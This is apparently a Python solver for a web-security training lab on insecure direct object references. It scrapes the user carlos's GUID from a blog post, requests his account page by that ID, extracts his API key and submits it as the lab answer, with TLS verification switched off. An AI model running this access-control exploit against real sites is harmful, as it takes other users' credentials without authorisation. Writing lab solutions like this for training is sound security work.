import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "User ID controlled by request parameter, with unpredictable user IDs"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Fetch a post published by carlos\n2. Extract carlos GUID from source code\n3. Fetch carlos profile using his GUID\n4. Extract the API key\n5. Submit the solution\n""")

    print(Fore.WHITE + "[1] Fetching a post published by carlos")
    post_page = requests.get(
        f"{url}/post?postId=3", verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE + "[2] Extracting carlos GUID from source code")
    carlos_guid = re.findall("userId=(.*)'>carlos", post_page.text)[0]
    print(Fore.GREEN + "Carlos GUID" + Fore.WHITE +
          " => " + Fore.YELLOW + carlos_guid)

    print(Fore.WHITE + "[3] Fetching carlos profile page")

    carlos_profile = requests.get(
        f"{url}/my-account?id={carlos_guid}", verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE +
          "[4] Extracting the API key")
    api_key = re.findall("Your API Key is: (.*)</div>", carlos_profile.text)[0]
    print(Fore.GREEN + "API key" + Fore.WHITE + " => " + Fore.YELLOW + api_key)
    data = {"answer": api_key}

    print(Fore.WHITE + "[5] Submitting the solution")

    try:
        r = requests.post(
            f"{url}/submitSolution", data=data, verify=False, allow_redirects=False, proxies=proxies)
        return True

    except Exception as e:
        print(f"[!] Failed to fetch payload through exception")
        return False
